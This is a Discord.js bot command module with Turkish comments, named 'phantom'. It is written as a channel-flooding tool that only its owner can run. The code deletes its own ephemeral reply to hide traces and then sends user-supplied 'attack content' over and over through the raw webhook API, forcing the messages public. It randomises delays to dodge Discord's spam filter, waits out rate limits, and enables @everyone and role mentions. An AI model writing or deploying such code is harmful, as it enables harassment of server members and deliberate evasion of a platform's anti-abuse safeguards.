const { SlashCommandBuilder, Routes } = require('discord.js');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('phantom')
        .setDescription('Phantom Mode: Sistem filtresini bypass ederek kanalı duman eder.')
        .addStringOption(option => option.setName('mesaj').setRequired(true).setDescription('Saldırı içeriği'))
        .addIntegerOption(option => option.setName('miktar').setRequired(false).setDescription('Mermi sayısı'))
        .setContexts([0, 1, 2])
        .setIntegrationTypes([0, 1]),

    async execute(interaction) {
        const OWNER_ID = "1389930042200559706";
        if (interaction.user.id !== OWNER_ID) return;

        const icerik = interaction.options.getString('mesaj');
        const miktar = interaction.options.getInteger('miktar') || 15;

        // --- PHANTOM ADIM 1: SİS BOMBASI ---
        // 'ephemeral: true' ile başlıyoruz ki Discord bizi 'zararsız' sansın.
        await interaction.reply({ content: '🌑 **Phantom Mode Activated.**', ephemeral: true });

        // --- PHANTOM ADIM 2: İZLERİ SİL ---
        // Hemen orijinal yanıtı siliyoruz.
        await interaction.deleteReply().catch(() => {});

        // --- PHANTOM ADIM 3: RAW API BOMBARDIMANI ---
        // Burası 'Phantom' kısmıdır. Discord.js'in 'followUp' kısıtlamalarını atlayıp 
        // doğrudan API'ye 'flags: 0' (Herkese Açık) isteği gönderiyoruz.
        for (let i = 0; i < miktar; i++) {
            try {
                // Her mesaj arasında farklı ms (milisaniye) bırakarak Discord'un 'spam' filtresini şaşırtıyoruz.
                const delay = Math.floor(Math.random() * (900 - 500 + 1)) + 500;
                await new Promise(r => setTimeout(r, delay));

                await interaction.client.rest.post(
                    Routes.webhookMessage(interaction.applicationId, interaction.token),
                    {
                        body: {
                            content: icerik,
                            flags: 0, // ZORLA PUBLIC YAPMA
                            allowed_mentions: { parse: ['users', 'roles', 'everyone'] }
                        }
                    }
                );
            } catch (err) {
                // Discord 'DUR' diyene kadar devam...
                if (err.status === 429) {
                    console.log("Phantom hız sınırına takıldı, 2 saniye mola...");
                    await new Promise(r => setTimeout(r, 2000));
                } else {
                    break;
                }
            }
        }
    }
};
